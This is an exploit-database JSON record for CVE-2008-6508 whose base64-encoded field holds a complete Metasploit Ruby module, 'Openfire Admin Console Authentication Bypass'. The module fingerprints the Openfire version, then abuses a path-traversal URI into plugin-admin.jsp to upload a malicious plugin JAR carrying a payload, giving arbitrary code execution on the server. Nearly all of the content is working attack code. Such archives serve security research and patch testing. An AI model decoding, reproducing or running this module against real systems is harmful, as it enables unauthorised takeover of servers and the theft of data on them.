{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyAgIGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9mcmFtZXdvcmsvDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCnJlcXVpcmUgJ3JleC96aXAnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQoJSHR0cEZpbmdlcnByaW50ID0geyA6cGF0dGVybiA9PiBbIC8oSmV0dHkpLyBdIH0NCg0KCWluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RVhFDQoNCglkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQoJCXN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQoJCQknTmFtZScgICAgICAgID0+ICdPcGVuZmlyZSBBZG1pbiBDb25zb2xlIEF1dGhlbnRpY2F0aW9uIEJ5cGFzcycsDQoJCQknRGVzY3JpcHRpb24nID0+ICVxew0KCQkJCQlUaGlzIG1vZHVsZSBleHBsb2l0cyBhbiBhdXRoZW50aWNhdGlvbiBieXBhc3MgdnVsbmVyYWJpbGl0eSBpbiB0aGUgYWRtaW5pc3RyYXRpb24NCgkJCQljb25zb2xlIG9mIE9wZW5maXJlIHNlcnZlcnMuIEJ5IHVzaW5nIHRoaXMgdnVsbmVyYWJpbGl0eSBpdCBpcyBwb3NzaWJsZSB0bw0KCQkJCXVwbG9hZC9leGVjdXRlIGEgbWFsaWNpb3VzIE9wZW5maXJlIHBsdWdpbiBvbiB0aGUgc2VydmVyIGFuZCBleGVjdXRlIGFyYml0cmFyeSBKYXZhDQoJCQkJY29kZS4gVGhpcyBtb2R1bGUgaGFzIGJlZW4gdGVzdGVkIGFnYWluc3QgT3BlbmZpcmUgMy42LjBhLg0KDQoJCQkJSXQgaXMgcG9zc2libGUgdG8gcmVtb3ZlIHRoZSB1cGxvYWRlZCBwbHVnaW4gYWZ0ZXIgZXhlY3V0aW9uLCBob3dldmVyIHRoaXMgbWlnaHQgdHVybg0KCQkJCXRoZSBzZXJ2ZXIgaW4gc29tZSBraW5kIG9mIHVuc3RhYmxlIHN0YXRlLCBtYWtpbmcgcmUtZXhwbG9pdGF0aW9uIGRpZmZpY3VsdC4gWW91IG1pZ2h0DQoJCQkJd2FudCB0byBkbyB0aGlzIG1hbnVhbGx5Lg0KCQkJfSwNCgkJCSdBdXRob3InICAgICAgPT4NCgkJCQlbDQoJCQkJCSdBbmRyZWFzIEt1cnR6JywgIyBWdWxuZXJhYmlsaXR5IGRpc2NvdmVyeQ0KCQkJCQknaDBuZzEwJyAgICAgICAgICMgTWV0YXNwbG9pdCBtb2R1bGUNCgkJCQldLA0KCQkJJ0xpY2Vuc2UnICAgICA9PiBNU0ZfTElDRU5TRSwNCgkJCSdSZWZlcmVuY2VzJyAgPT4NCgkJCQlbDQoJCQkJCVsgJ0NWRScsICcyMDA4LTY1MDgnIF0sDQoJCQkJCVsgJ09TVkRCJywgJzQ5NjYzJyBdLA0KCQkJCQlbICdCSUQnLCAnMzIxODknIF0sDQoJCQkJCVsgJ0VEQicsICc3MDc1JyBdLA0KCQkJCQlbICdVUkwnLCAnaHR0cDovL2NvbW11bml0eS5pZ25pdGVyZWFsdGltZS5vcmcvdGhyZWFkLzM1ODc0JyBdDQoJCQkJXSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gJ05vdiAxMCAyMDA4JywNCgkJCSdQcml2aWxlZ2VkJyAgPT4gdHJ1ZSwNCgkJCSdQbGF0Zm9ybScgICAgPT4gWydqYXZhJywgJ3dpbicsICdsaW51eCcgXSwNCgkJCSdTdGFuY2UnICAgICAgPT4gTXNmOjpFeHBsb2l0OjpTdGFuY2U6OkFnZ3Jlc3NpdmUsDQoJCQknVGFyZ2V0cycgICAgID0+DQoJCQkJWw0KCQkJCQkjDQoJCQkJCSMgSmF2YSB2ZXJzaW9uDQoJCQkJCSMNCgkJCQkJWyAnSmF2YSBVbml2ZXJzYWwnLA0KCQkJCQkJew0KCQkJCQkJCQknQXJjaCcgPT4gQVJDSF9KQVZBLA0KCQkJCQkJCQknUGxhdGZvcm0nID0+ICdqYXZhJw0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQkjDQoJCQkJCSMgUGxhdGZvcm0gc3BlY2lmaWMgdGFyZ2V0cw0KCQkJCQkjDQoJCQkJCVsgJ1dpbmRvd3MgeDg2IChOYXRpdmUgUGF5bG9hZCknLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ3dpbicsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfWDg2LA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdMaW51eCB4ODYgKE5hdGl2ZSBQYXlsb2FkKScsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiAnbGludXgnLA0KCQkJCQkJCSdBcmNoJyA9PiBBUkNIX1g4NiwNCgkJCQkJCX0NCgkJCQkJXQ0KCQkJCV0sDQoJCQknRGVmYXVsdFRhcmdldCcgICA9PiAwLA0KDQoJCSkpDQoNCgkJcmVnaXN0ZXJfb3B0aW9ucygNCgkJCVsNCgkJCQlPcHQ6OlJQT1JUKDkwOTApLA0KCQkJCU9wdFN0cmluZy5uZXcoJ1RBUkdFVFVSSScsIFt0cnVlLCAnVGhlIGJhc2UgcGF0aCB0byB0aGUgd2ViIGFwcGxpY2F0aW9uJywgJy8nXSksDQoJCQkJT3B0U3RyaW5nLm5ldygnUExVR0lOTkFNRScsICBbIGZhbHNlLCAnT3BlbmZpcmUgcGx1Z2luIGJhc2UgbmFtZSwgKGRlZmF1bHQ6IHJhbmRvbSknIF0pLA0KCQkJCU9wdFN0cmluZy5uZXcoJ1BMVUdJTkFVVEhPUicsWyBmYWxzZSwgJ09wZW5maXJlIHBsdWdpbiBhdXRob3IsIChkZWZhdWx0OiByYW5kb20pJyBdKSwNCgkJCQlPcHRTdHJpbmcubmV3KCdQTFVHSU5ERVNDJywgIFsgZmFsc2UsICdPcGVuZmlyZSBwbHVnaW4gZGVzY3JpcHRpb24sIChkZWZhdWx0OiByYW5kb20pJyBdKSwNCgkJCQlPcHRCb29sLm5ldygnUkVNT1ZFX1BMVUdJTicsIFsgZmFsc2UsICdUcnkgdG8gcmVtb3ZlIHRoZSBwbHVnaW4gYWZ0ZXIgaW5zdGFsbGF0aW9uJywgZmFsc2UgXSksDQoJCQldLCBzZWxmLmNsYXNzKQ0KCWVuZA0KDQoJZGVmIGNoZWNrDQoJCWJhc2UgPSB0YXJnZXRfdXJpLnBhdGgNCgkJYmFzZSA8PCAnLycgaWYgYmFzZVstMSwgMV0gIT0gJy8nDQoNCgkJcGF0aCA9ICIje2Jhc2V9bG9naW4uanNwIg0KCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KCQkJew0KCQkJCSd1cmknICAgID0+IHBhdGgNCgkJCX0pDQoNCgkJaWYgKG5vdCByZXMpIG9yIChyZXMuY29kZSAhPSAyMDApDQoJCQlwcmludF9lcnJvcigiVW5hYmxlIHRvIG1ha2UgYSByZXF1ZXN0IHRvOiAje3BhdGh9IikNCgkJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCgkJZW5kDQoNCgkJdmVyc2lvbmNoZWNrID0gcmVzLmJvZHkgPX4gL09wZW5maXJlLCBcRCo6IChcZClcLihcZCkuKFxkKVxzKjxcL2Rpdj4vDQoNCgkJaWYgdmVyc2lvbmNoZWNrLm5pbD8gdGhlbg0KCQkJcHJpbnRfZXJyb3IoIlVuYWJsZSB0byBkZXRlY3QgT3BlbmZpcmUgdmVyc2lvbiIpDQoJCQlyZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duDQoJCWVuZA0KDQoJCXByaW50X3N0YXR1cygiRGV0ZWN0ZWQgdmVyc2lvbjogI3skMX0uI3skMn0uI3skM30iKQ0KCQl2ZXJzaW9uID0gIiN7JDF9I3skMn0jeyQzfSIudG9faQ0KDQoJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUgaWYgdmVyc2lvbiA+IDM2MA0KDQoJCSMgSnVzdCB0byBiZSBzdXJlLCB0cnkgdG8gYWNjZXNzIHRoZSBsb2cgcGFnZQ0KCQlwYXRoID0gIiN7YmFzZX1zZXR1cC9zZXR1cC0vLi4vLi4vbG9nLmpzcCINCgkJcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCgkJCXsNCgkJCQkndXJpJyAgICA9PiBwYXRoDQoJCQl9KQ0KDQoJCWlmIChub3QgcmVzKSBvciAocmVzLmNvZGUgIT0gMjAwKQ0KCQkJcHJpbnRfZXJyb3IoIkZhaWxlZDogRXJyb3IgcmVxdWVzdGluZyAje3BhdGh9IikNCgkJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlVua25vd24NCgkJZW5kDQoNCgkJRXhwbG9pdDo6Q2hlY2tDb2RlOjpWdWxuZXJhYmxlDQoJZW5kDQoNCglkZWYgZ2V0X3BsdWdpbl9qYXIocGx1Z2luX25hbWUpDQoJCWZpbGVzID0gWw0KCQkJWyAibG9nb19sYXJnZS5naWYiIF0sDQoJCQlbICJsb2dvX3NtYWxsLmdpZiIgXSwNCgkJCVsgInJlYWRtZS5odG1sIiBdLA0KCQkJWyAiY2hhbmdlbG9nLmh0bWwiIF0sDQoJCQlbICJsaWIiLCAicGx1Z2luLW1ldGFzcGxvaXQuamFyIiBdDQoJCV0NCg0KCQlqYXIgPSBSZXg6OlppcDo6SmFyLm5ldw0KCQlqYXIuYWRkX2ZpbGVzKGZpbGVzLCBGaWxlLmpvaW4oTXNmOjpDb25maWcuaW5zdGFsbF9yb290LCAiZGF0YSIsICJleHBsb2l0cyIsICJDVkUtMjAwOC02NTA4IikpDQoNCgkJcGx1Z2luX2F1dGhvciA9IGRhdGFzdG9yZVsnUExVR0lOQVVUSE9SJ10gfHwgcmFuZF90ZXh0X2FscGhhbnVtZXJpYyg4K3JhbmQoOCkpDQoJCXBsdWdpbl9kZXNjICAgPSBkYXRhc3RvcmVbJ1BMVUdJTkRFU0MnXSAgIHx8IHJhbmRfdGV4dF9hbHBoYW51bWVyaWMoOCtyYW5kKDgpKQ0KDQoJCXBsdWdpbl94bWwgPSBGaWxlLm9wZW4oRmlsZS5qb2luKE1zZjo6Q29uZmlnLmluc3RhbGxfcm9vdCwgImRhdGEiLCAiZXhwbG9pdHMiLCAiQ1ZFLTIwMDgtNjUwOCIsICJwbHVnaW4ueG1sIiksICJyYiIpIHt8ZmR8IGZkLnJlYWQoKSB9DQoJCXBsdWdpbl94bWwuZ3N1YiEoL1BMVUdJTk5BTUUvLCBwbHVnaW5fbmFtZSkNCgkJcGx1Z2luX3htbC5nc3ViISgvUExVR0lOREVTQ1JJUFRJT04vLCBwbHVnaW5fZGVzYykNCgkJcGx1Z2luX3htbC5nc3ViISgvUExVR0lOQVVUSE9SLywgcGx1Z2luX2F1dGhvcikNCg0KCQlqYXIuYWRkX2ZpbGUoInBsdWdpbi54bWwiLCBwbHVnaW5feG1sKQ0KDQoJCWphcg0KCWVuZA0KDQoJZGVmIGV4cGxvaXQNCgkJYmFzZSA9IHRhcmdldF91cmkucGF0aA0KCQliYXNlIDw8ICcvJyBpZiBiYXNlWy0xLCAxXSAhPSAnLycNCg0KCQlwbHVnaW5fbmFtZSA9IGRhdGFzdG9yZVsnUExVR0lOTkFNRSddIHx8IHJhbmRfdGV4dF9hbHBoYW51bWVyaWMoOCtyYW5kKDgpKQ0KCQlwbHVnaW4gPSBnZXRfcGx1Z2luX2phcihwbHVnaW5fbmFtZSkNCg0KCQlhcmNoID0gdGFyZ2V0LmFyY2gNCgkJcGxhdCA9IFtNc2Y6Ok1vZHVsZTo6UGxhdGZvcm1MaXN0Lm5ldyh0YXJnZXRbJ1BsYXRmb3JtJ10pLnBsYXRmb3Jtc1swXV0NCg0KCQlpZiAocCA9IGV4cGxvaXRfcmVnZW5lcmF0ZV9wYXlsb2FkKHBsYXQsIGFyY2gpKSA9PSBuaWwNCgkJCXByaW50X2Vycm9yKCJGYWlsZWQgdG8gcmVnZW5lcmF0ZSBwYXlsb2FkIikNCgkJCXJldHVybg0KCQllbmQNCg0KCQlwbHVnaW4uYWRkX2ZpbGUoImxpYi8je3JhbmRfdGV4dF9hbHBoYW51bWVyaWMoOCl9LmphciIsIHBheWxvYWQuZW5jb2RlZF9qYXIucGFjaykNCgkJcGx1Z2luLmJ1aWxkX21hbmlmZXN0DQoNCgkJIyBVcGxvYWQgdGhlIHBsdWdpbiB0byB0aGUgc2VydmVyDQoJCXByaW50X3N0YXR1cygiVXBsb2FkaW5nIHBsdWdpbiAje3BsdWdpbl9uYW1lfSB0byB0aGUgc2VydmVyIikNCgkJYm91bmRhcnkgPSByYW5kX3RleHRfYWxwaGFudW1lcmljKDYpDQoNCgkJZGF0YSA9ICItLSN7Ym91bmRhcnl9XHJcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cInVwbG9hZGZpbGVcIjsgIg0KCQlkYXRhIDw8ICJmaWxlbmFtZT1cIiN7cGx1Z2luX25hbWV9LmphclwiXHJcbkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vamF2YS1hcmNoaXZlXHJcblxyXG4iDQoJCWRhdGEgPDwgcGx1Z2luLnBhY2sNCgkJZGF0YSA8PCAiXHJcbi0tI3tib3VuZGFyeX0tLSINCg0KCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCSd1cmknICAgICA9PiAiI3tiYXNlfXNldHVwL3NldHVwLS8uLi8uLi9wbHVnaW4tYWRtaW4uanNwP3VwbG9hZHBsdWdpbiIsDQoJCQknbWV0aG9kJyAgPT4gJ1BPU1QnLA0KCQkJJ2RhdGEnICAgID0+IGRhdGEsDQoJCQknaGVhZGVycycgPT4NCgkJCQl7DQoJCQkJCSdDb250ZW50LVR5cGUnICAgPT4gJ211bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PScgKyBib3VuZGFyeSwNCgkJCQkJJ0NvbnRlbnQtTGVuZ3RoJyA9PiBkYXRhLmxlbmd0aCwNCgkJCQkJJ0Nvb2tpZScgPT4gIkpTRVNTSU9OSUQ9I3tyYW5kX3RleHRfbnVtZXJpYygxMyl9IiwNCgkJCQl9DQoJCX0pDQoNCg0KCQlwcmludF9lcnJvcigiV2FybmluZzogZ290IG5vIHJlc3BvbnNlIGZyb20gdGhlIHVwbG9hZCwgY29udGludWluZy4uLiIpIGlmICFyZXMNCg0KCQkjIERlbGV0ZSB0aGUgdXBsb2FkZWQgSkFSIGZpbGUNCgkJaWYgZGF0YXN0b3JlWydSRU1PVkVfUExVR0lOJ10NCgkJCXByaW50X3N0YXR1cygiRGVsZXRpbmcgcGx1Z2luICN7cGx1Z2luX25hbWV9IGZyb20gdGhlIHNlcnZlciIpDQoJCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCQkndXJpJyAgICAgPT4gIiN7YmFzZX1zZXR1cC9zZXR1cC0vLi4vLi4vcGx1Z2luLWFkbWluLmpzcD9kZWxldGVwbHVnaW49I3twbHVnaW5fbmFtZS5kb3duY2FzZX0iLA0KCQkJCSdoZWFkZXJzJyA9Pg0KCQkJCQl7DQoJCQkJCQknQ29va2llJyA9PiAiSlNFU1NJT05JRD0je3JhbmRfdGV4dF9udW1lcmljKDEzKX0iLA0KCQkJCQl9DQoJCQl9KQ0KCQkJaWYgbm90IHJlcw0KCQkJCXByaW50X2Vycm9yKCJFcnJvciBkZWxldGluZyB0aGUgcGx1Z2luICN7cGx1Z2luX25hbWV9LiBZb3UgbWlnaHQgd2FudCB0byBkbyB0aGlzIG1hbnVhbGx5LiIpDQoJCQllbmQNCgkJZW5kDQoJZW5kDQplbmQ=", 
    "filename": "platforms/jsp/webapps/19432.rb", 
    "id": "19432", 
    "cves": [
        "CVE-2008-6508"
    ]
}